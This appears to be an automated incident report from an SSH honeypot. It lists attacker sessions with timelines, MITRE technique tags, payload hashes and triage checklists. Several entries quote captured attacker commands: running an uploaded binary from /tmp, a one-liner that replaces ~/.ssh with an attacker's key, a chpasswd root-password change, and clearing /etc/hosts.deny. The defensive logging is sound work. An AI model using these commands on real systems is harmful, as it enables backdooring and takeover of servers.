| `2026-11-27 06:12:59` | `cowrie.client.kex` |
| `2026-11-27 06:13:00` | `cowrie.login.success` |
| `2026-11-27 06:13:00` | `cowrie.session.params` |
| `2026-11-27 06:13:00` | `cowrie.command.input` |
| `2026-11-27 06:13:00` | `cowrie.command.failed` |
| `2026-11-27 06:13:00` | `cowrie.log.closed` |
| `2026-11-27 06:13:01` | `cowrie.session.params` |
| `2026-11-27 06:13:01` | `cowrie.command.input` |
| `2026-11-27 06:13:01` | `cowrie.session.file_download` |
| `2026-11-27 06:13:01` | `cowrie.log.closed` |
| `2026-11-27 06:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.90.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `95.90.13[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8e2ffb1f410

| Field | Detail |
|---|---|
| **Source IP** | `95.90.13[.]168` |
| **First Seen** | 2026-11-27 06:13 |
| **Last Seen** | 2026-11-27 06:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:13:02` | `cowrie.session.connect` |
| `2026-11-27 06:13:02` | `cowrie.client.version` |
| `2026-11-27 06:13:02` | `cowrie.client.kex` |
| `2026-11-27 06:13:03` | `cowrie.login.success` |
| `2026-11-27 06:13:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `95.90.13[.]168` to AbuseIPDB if not already reported
- [ ] Block `95.90.13[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58a291ae9694

| Field | Detail |
|---|---|
| **Source IP** | `218.157.163[.]203` |
| **First Seen** | 2026-11-27 06:25 |
| **Last Seen** | 2026-11-27 06:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `scp -t /tmp/cUb4NAfm` |
| **Download Attempts** | b1b8308d882329d9d10fed76e51cbdcba10a899abeeda81cda4764f61a4804d1 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:25:20` | `cowrie.session.connect` |
| `2026-11-27 06:25:20` | `cowrie.client.version` |
| `2026-11-27 06:25:20` | `cowrie.client.kex` |
| `2026-11-27 06:25:21` | `cowrie.login.success` |
| `2026-11-27 06:25:22` | `cowrie.client.var` |
| `2026-11-27 06:25:22` | `cowrie.session.params` |
| `2026-11-27 06:25:22` | `cowrie.command.input` |
| `2026-11-27 06:25:23` | `cowrie.session.file_download` |
| `2026-11-27 06:25:23` | `cowrie.log.closed` |
| `2026-11-27 06:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.157.163[.]203` to AbuseIPDB if not already reported
- [ ] Block `218.157.163[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adf9aab416b

| Field | Detail |
|---|---|
| **Source IP** | `218.157.163[.]203` |
| **First Seen** | 2026-11-27 06:25 |
| **Last Seen** | 2026-11-27 06:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp && chmod +x cUb4NAfm && bash -c ./cUb4NAfm, ./cUb4NAfm` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:25:24` | `cowrie.session.connect` |
| `2026-11-27 06:25:24` | `cowrie.client.version` |
| `2026-11-27 06:25:24` | `cowrie.client.kex` |
| `2026-11-27 06:25:25` | `cowrie.login.success` |
| `2026-11-27 06:25:25` | `cowrie.client.var` |
| `2026-11-27 06:25:26` | `cowrie.session.params` |
| `2026-11-27 06:25:26` | `cowrie.command.input` |
| `2026-11-27 06:25:26` | `cowrie.command.input` |
| `2026-11-27 06:25:26` | `cowrie.command.failed` |
| `2026-11-27 06:25:26` | `cowrie.log.closed` |
| `2026-11-27 06:25:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.157.163[.]203` to AbuseIPDB if not already reported
- [ ] Block `218.157.163[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e631fbbf4922

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]39` |
| **First Seen** | 2026-11-27 06:26 |
| **Last Seen** | 2026-11-27 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:26:05` | `cowrie.session.connect` |
| `2026-11-27 06:26:05` | `cowrie.client.version` |
| `2026-11-27 06:26:05` | `cowrie.client.kex` |
| `2026-11-27 06:26:06` | `cowrie.login.success` |
| `2026-11-27 06:26:07` | `cowrie.session.params` |
| `2026-11-27 06:26:07` | `cowrie.command.input` |
| `2026-11-27 06:26:07` | `cowrie.log.closed` |
| `2026-11-27 06:26:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]39` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]39` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-986d3b669756

| Field | Detail |
|---|---|
| **Source IP** | `41.153.30[.]115` |
| **First Seen** | 2026-11-27 06:27 |
| **Last Seen** | 2026-11-27 06:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:27:01` | `cowrie.session.connect` |
| `2026-11-27 06:27:01` | `cowrie.client.version` |
| `2026-11-27 06:27:01` | `cowrie.client.kex` |
| `2026-11-27 06:27:03` | `cowrie.login.success` |
| `2026-11-27 06:27:05` | `cowrie.session.params` |
| `2026-11-27 06:27:05` | `cowrie.command.input` |
| `2026-11-27 06:27:05` | `cowrie.command.failed` |
| `2026-11-27 06:27:05` | `cowrie.log.closed` |
| `2026-11-27 06:27:07` | `cowrie.session.params` |
| `2026-11-27 06:27:07` | `cowrie.command.input` |
| `2026-11-27 06:27:12` | `cowrie.session.file_download` |
| `2026-11-27 06:27:12` | `cowrie.log.closed` |
| `2026-11-27 06:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.153.30[.]115` to AbuseIPDB if not already reported
- [ ] Block `41.153.30[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-210fcbe0136d

| Field | Detail |
|---|---|
| **Source IP** | `103.42.74[.]124` |
| **First Seen** | 2026-11-27 06:27 |
| **Last Seen** | 2026-11-27 06:29 |
| **Session Duration** | 120s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:4d510rg2B3Rm"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:27:40` | `cowrie.session.connect` |
| `2026-11-27 06:27:40` | `cowrie.client.version` |
| `2026-11-27 06:27:40` | `cowrie.client.kex` |
| `2026-11-27 06:27:42` | `cowrie.login.success` |
| `2026-11-27 06:27:44` | `cowrie.session.params` |
| `2026-11-27 06:27:44` | `cowrie.command.input` |
| `2026-11-27 06:27:44` | `cowrie.command.failed` |
| `2026-11-27 06:27:46` | `cowrie.log.closed` |
| `2026-11-27 06:27:48` | `cowrie.session.params` |
| `2026-11-27 06:27:48` | `cowrie.command.input` |
| `2026-11-27 06:27:49` | `cowrie.session.file_download` |
| `2026-11-27 06:27:49` | `cowrie.log.closed` |
| `2026-11-27 06:28:16` | `cowrie.session.params` |
| `2026-11-27 06:28:16` | `cowrie.command.input` |
| `2026-11-27 06:28:16` | `cowrie.log.closed` |
| … | _48 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `103.42.74[.]124` to AbuseIPDB if not already reported
- [ ] Block `103.42.74[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab55f728e94

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-11-27 06:32 |
| **Last Seen** | 2026-11-27 06:33 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:32:58` | `cowrie.session.connect` |
| `2026-11-27 06:32:58` | `cowrie.client.version` |
| `2026-11-27 06:32:58` | `cowrie.client.kex` |
| `2026-11-27 06:32:59` | `cowrie.login.success` |
| `2026-11-27 06:33:00` | `cowrie.session.params` |
| `2026-11-27 06:33:00` | `cowrie.command.input` |
| `2026-11-27 06:33:00` | `cowrie.command.failed` |
| `2026-11-27 06:33:01` | `cowrie.log.closed` |
| `2026-11-27 06:33:02` | `cowrie.session.params` |
| `2026-11-27 06:33:02` | `cowrie.command.input` |
| `2026-11-27 06:33:03` | `cowrie.session.file_download` |
| `2026-11-27 06:33:03` | `cowrie.log.closed` |
| `2026-11-27 06:33:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b140a3c75bd

| Field | Detail |
|---|---|
| **Source IP** | `38.137.11[.]14` |
| **First Seen** | 2026-11-27 06:33 |
| **Last Seen** | 2026-11-27 06:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:33:03` | `cowrie.session.connect` |
| `2026-11-27 06:33:03` | `cowrie.client.version` |
| `2026-11-27 06:33:03` | `cowrie.client.kex` |
| `2026-11-27 06:33:05` | `cowrie.login.success` |
| `2026-11-27 06:33:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `38.137.11[.]14` to AbuseIPDB if not already reported
- [ ] Block `38.137.11[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-197b67a8d760

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-27 06:37 |
| **Last Seen** | 2026-11-27 06:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 06:37:05` | `cowrie.session.connect` |
| `2026-11-27 06:37:05` | `cowrie.client.version` |
| `2026-11-27 06:37:05` | `cowrie.client.kex` |
| `2026-11-27 06:37:06` | `cowrie.login.success` |
| `2026-11-27 06:37:06` | `cowrie.direct-tcpip.request` |
| `2026-11-27 06:37:06` | `cowrie.direct-tcpip.data` |
| `2026-11-27 06:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (192) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-f1ada3069553 | HIGH | `172.239.71[.]245` | 2026-11-27 06:51 | Y | 3 | 0 | `T1078` |
| IR-1f6951673fc5 | HIGH | `51.38.224[.]114` | 2026-11-27 06:58 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0d29d760aac0 | HIGH | `51.38.224[.]114` | 2026-11-27 06:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cfae61d16bfb | HIGH | `195.178.110[.]78` | 2026-11-27 07:00 | Y | 0 | 0 | `T1078` |
| IR-b2be1621c58c | HIGH | `99.92.204[.]98` | 2026-11-27 07:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ee1f8c41d419 | HIGH | `99.92.204[.]98` | 2026-11-27 07:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-84526f7cb581 | HIGH | `77.239.112[.]177` | 2026-11-27 07:01 | Y | 0 | 0 | `T1078` |
| IR-2cebddebf20a | HIGH | `113.193.234[.]210` | 2026-11-27 07:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9384b253e9df | HIGH | `113.193.234[.]210` | 2026-11-27 07:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0797244f7773 | HIGH | `46.135.98[.]68` | 2026-11-27 07:21 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-23370dbb24a5 | HIGH | `46.135.98[.]68` | 2026-11-27 07:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3705c55013b6 | HIGH | `74.82.47[.]3` | 2026-11-27 07:22 | Y | 3 | 0 | `T1078` |
| IR-530dfa1034e2 | HIGH | `154.125.228[.]145` | 2026-11-27 07:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-428bf31d1436 | HIGH | `154.125.228[.]145` | 2026-11-27 07:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-adf541b3df4e | HIGH | `109.160.32[.]39` | 2026-11-27 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-40d12378eeee | HIGH | `209.99.190[.]186` | 2026-11-27 08:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2665b0070cd2 | HIGH | `177.75.235[.]46` | 2026-11-27 08:02 | Y | 1 | 0 | `T1078 · T1592` |
| IR-62b9635e0bb2 | HIGH | `163.52.135[.]28` | 2026-11-27 08:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-46ff3c7a592d | HIGH | `176.53.159[.]196` | 2026-11-27 08:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ea7acad8f304 | HIGH | `77.239.112[.]177` | 2026-11-27 08:09 | Y | 0 | 0 | `T1078` |
| IR-fe9826673b40 | HIGH | `85.24.223[.]224` | 2026-11-27 08:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cd002f7bc84f | HIGH | `85.24.223[.]224` | 2026-11-27 08:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cda696d4720b | HIGH | `195.178.110[.]78` | 2026-11-27 08:32 | Y | 0 | 0 | `T1078` |
| IR-4adc511efbf2 | HIGH | `78.128.112[.]74` | 2026-11-27 08:43 | Y | 1 | 0 | `T1078 · T1592` |
| IR-518dc74a06c6 | HIGH | `187.45.95[.]66` | 2026-11-27 09:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-03086f2a26d6 | HIGH | `187.45.95[.]66` | 2026-11-27 09:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d20263896837 | HIGH | `138.124.124[.]210` | 2026-11-27 09:43 | Y | 4 | 0 | `T1078` |
| IR-f12d9fe0ff38 | HIGH | `138.124.124[.]212` | 2026-11-27 09:52 | Y | 0 | 0 | `T1078` |
| IR-45ab58f4441f | HIGH | `138.124.116[.]194` | 2026-11-27 09:59 | Y | 0 | 0 | `T1078` |
| IR-c553c792b045 | HIGH | `209.99.190[.]186` | 2026-11-27 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e6bc60a4edaf | HIGH | `177.75.235[.]46` | 2026-11-27 10:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4da3a1df73e8 | HIGH | `163.52.135[.]28` | 2026-11-27 10:05 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2a0f5785b9a5 | HIGH | `217.60.240[.]247` | 2026-11-27 10:06 | Y | 0 | 0 | `T1078` |
| IR-43f439c5b664 | HIGH | `176.53.159[.]196` | 2026-11-27 10:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a123cab3a61 | HIGH | `109.91.4[.]177` | 2026-11-27 10:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-59dcecd3bd57 | HIGH | `109.91.4[.]177` | 2026-11-27 10:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ccd9c7ca3f53 | HIGH | `195.178.110[.]78` | 2026-11-27 10:51 | Y | 0 | 0 | `T1078` |
| IR-e56fec9214a9 | HIGH | `77.239.112[.]177` | 2026-11-27 11:02 | Y | 0 | 0 | `T1078` |
| IR-fd2d959673a9 | HIGH | `195.178.110[.]228` | 2026-11-27 11:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d37b557d53cf | HIGH | `195.178.110[.]228` | 2026-11-27 11:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cdebbfa454de | HIGH | `195.178.110[.]228` | 2026-11-27 11:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ead79025445f | HIGH | `195.178.110[.]228` | 2026-11-27 11:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0d2830db33c3 | HIGH | `195.178.110[.]228` | 2026-11-27 11:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b3638e1b483c | HIGH | `195.178.110[.]228` | 2026-11-27 11:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3a4d7c899a9a | HIGH | `195.178.110[.]228` | 2026-11-27 11:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-82cd959ceace | HIGH | `195.178.110[.]228` | 2026-11-27 11:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-302716fa697b | HIGH | `196.50.29[.]16` | 2026-11-27 11:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fc05d40db19e | HIGH | `196.50.29[.]16` | 2026-11-27 11:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bc7b8524cb16 | HIGH | `112.74.98[.]122` | 2026-11-27 11:56 | Y | 1 | 0 | `T1078 · T1592` |
| IR-69e42b97a12e | HIGH | `112.74.98[.]122` | 2026-11-27 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-62e6eb0ab456 | HIGH | `209.99.190[.]186` | 2026-11-27 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-1e276ea4eb8e | HIGH | `163.52.135[.]28` | 2026-11-27 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e69a596a00f0 | HIGH | `177.75.235[.]46` | 2026-11-27 12:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-20f7aeefcadc | HIGH | `77.239.112[.]177` | 2026-11-27 12:03 | Y | 0 | 0 | `T1078` |
| IR-4bc8fccd9888 | HIGH | `14.29.198[.]130` | 2026-11-27 12:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-805118326bec | HIGH | `14.29.198[.]130` | 2026-11-27 12:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cdcbbfb6cdfb | HIGH | `4.172.250[.]34` | 2026-11-27 12:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5dc0a48991e2 | HIGH | `4.172.250[.]34` | 2026-11-27 12:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b00c13f828ed | HIGH | `152.254.225[.]35` | 2026-11-27 12:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c8bf872c3057 | HIGH | `152.254.225[.]35` | 2026-11-27 12:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6ea65b6d61fa | HIGH | `176.53.159[.]196` | 2026-11-27 12:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3b085d1463a0 | HIGH | `195.178.110[.]78` | 2026-11-27 12:58 | Y | 0 | 0 | `T1078` |
| IR-be720bfd8c39 | HIGH | `45.43.63[.]207` | 2026-11-27 13:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-596faa4e7d54 | HIGH | `45.43.63[.]207` | 2026-11-27 13:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fc79d138c213 | HIGH | `161.118.210[.]55` | 2026-11-27 13:39 | Y | 1 | 0 | `T1078 · T1592` |
| IR-7cf1af80b6b3 | HIGH | `88.205.172[.]170` | 2026-11-27 13:41 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-0f6806908445 | HIGH | `180.76.179[.]77` | 2026-11-27 13:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cfc680c11305 | HIGH | `78.128.112[.]74` | 2026-11-27 13:53 | Y | 1 | 0 | `T1078 · T1592` |
| IR-38989b732ec2 | HIGH | `163.52.135[.]28` | 2026-11-27 14:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-db6a3a02693a | HIGH | `177.75.235[.]46` | 2026-11-27 14:01 | Y | 1 | 0 | `T1078 · T1592` |
| IR-95a46b832ead | HIGH | `103.187.165[.]26` | 2026-11-27 14:03 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5bb737e339f1 | HIGH | `103.187.165[.]26` | 2026-11-27 14:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79fb62750786 | HIGH | `195.178.110[.]78` | 2026-11-27 14:06 | Y | 0 | 0 | `T1078` |
| IR-019834b23766 | HIGH | `186.121.233[.]2` | 2026-11-27 14:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-05cc5e859cf5 | HIGH | `186.121.233[.]2` | 2026-11-27 14:12 | Y | 0 | 0 | `T1078 · T1592` |
| IR-217dcf255bc0 | HIGH | `161.118.210[.]55` | 2026-11-27 14:33 | Y | 1 | 0 | `T1078 · T1592` |
| IR-f6afc8a0d5be | HIGH | `176.53.159[.]196` | 2026-11-27 14:44 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d1102c6dbfb6 | HIGH | `14.225.206[.]187` | 2026-11-27 15:22 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fbee0509ee9e | HIGH | `14.225.206[.]187` | 2026-11-27 15:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e64346b5fc3 | HIGH | `177.11.196[.]84` | 2026-11-27 15:23 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e9579ed60b8c | HIGH | `177.11.196[.]84` | 2026-11-27 15:23 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c9fcdca178fd | HIGH | `98.70.48[.]241` | 2026-11-27 15:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d122a1e403f9 | HIGH | `98.70.48[.]241` | 2026-11-27 15:25 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19bafc1203c3 | HIGH | `2.57.122[.]150` | 2026-11-27 15:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-45e13bb0e744 | HIGH | `118.26.36[.]200` | 2026-11-27 15:32 | Y | 1 | 0 | `T1078` |
| IR-8c1d89df09aa | HIGH | `2.57.122[.]150` | 2026-11-27 15:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d0635f66fe78 | HIGH | `2.57.122[.]150` | 2026-11-27 15:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c49698f85c8f | HIGH | `2.57.122[.]150` | 2026-11-27 15:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f626061bff74 | HIGH | `2.57.122[.]150` | 2026-11-27 15:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3791f53b991b | HIGH | `2.57.122[.]150` | 2026-11-27 15:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d7453495355f | HIGH | `2.57.122[.]150` | 2026-11-27 15:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5228e236184e | HIGH | `2.57.122[.]150` | 2026-11-27 15:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-10329ca97d4e | HIGH | `2.57.122[.]150` | 2026-11-27 15:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-571eb9f81edc | HIGH | `2.57.122[.]150` | 2026-11-27 15:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-08a046b55953 | HIGH | `144.22.238[.]238` | 2026-11-27 15:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e1b3fab177ec | HIGH | `2.57.122[.]150` | 2026-11-27 15:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-07ab6e40cb82 | HIGH | `2.57.122[.]150` | 2026-11-27 15:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
